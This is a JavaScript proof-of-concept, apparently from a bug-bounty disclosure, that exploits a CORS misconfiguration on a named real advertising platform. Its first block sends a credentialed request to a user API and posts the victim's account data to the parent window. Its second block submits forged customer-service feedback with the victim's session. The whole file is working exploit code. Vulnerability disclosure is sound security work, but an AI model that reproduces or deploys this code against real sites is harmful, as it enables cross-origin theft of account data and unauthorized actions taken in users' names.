/*Using CORS to steal victim's informations*/
     var xmlhttp1 = new XMLHttpRequest()
     xmlhttp1.onreadystatechange=function()
	{
		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
		{
			top.postMessage(xmlhttp1.responseText, '*');
		}
	}
    	
	xmlhttp1.open("GET","https://ads.tiktok.com/athena/api/user/",true);
	xmlhttp1.withCredentials = true;
	xmlhttp1.send();

/*Using CORS to abuse the send a evil feedback to the customer service*/
     var xmlhttp2 = new XMLHttpRequest()
     var sendData = {"title":"","identify_key":"6a1e079024806640c5e1e695d13db80949525168a052299b4970f9c99cb5ac78","lang":"EN","data":{"items":[{"valid":true,"content":"(Abuse feedback POC)Hi team,How can i disable my account?","type":14},{"valid":true,"content":"Hi,team.How can i disable my account?I try to disable the account but i got some error from the server.please check my image file.","type":2},{"valid":true,"content":[{"url":"https://lf16-adcdn-sg.ibytedtos.com/obj/ad-platform-feedas-i18n-sg/2a06e4bd0df60356eed9fb1f63a76915.svg","file_name":"error.svg","file_key":"2a06e4bd0df60356eed9fb1f63a76915.svg","file_type":"file","file_url":"https://lf16-adcdn-sg.ibytedtos.com/obj/ad-platform-feedas-i18n-sg/2a06e4bd0df60356eed9fb1f63a76915.svg"}],"type":5},{"valid":true,"content":"johnstone.h1","type":1,"option_meaning":6},{"valid":true,"content":"1144939245943","type":1,"option_meaning":4},{"valid":true,"content":"India","type":4,"key":"India","option_meaning":0},{"valid":true,"content":"+4514455284839","type":1},{"valid":true,"content":"johnstone.h1@account.com","type":1},{"type":3,"content":{"category_1":"Other account information","category_1_id":"778413057"}}],"form_id":1674225710396421,"board_id":1674225321013253,"business_id":""}};
     xmlhttp2.onreadystatechange=function()
	{
		if (xmlhttp2.readyState==4 && xmlhttp2.status==200)
		{
			alert("Poc for abuse feedback,you can click the link below for prove.");
		}
	}
    	xmlhttp2.setRequestHeader('content-type', 'application/json');
	xmlhttp2.open("POST","https://ads.tiktok.com/athena/api/order/submit/",true);
	xmlhttp2.withCredentials = true;
	xmlhttp2.send(JSON.stringify(sendData));
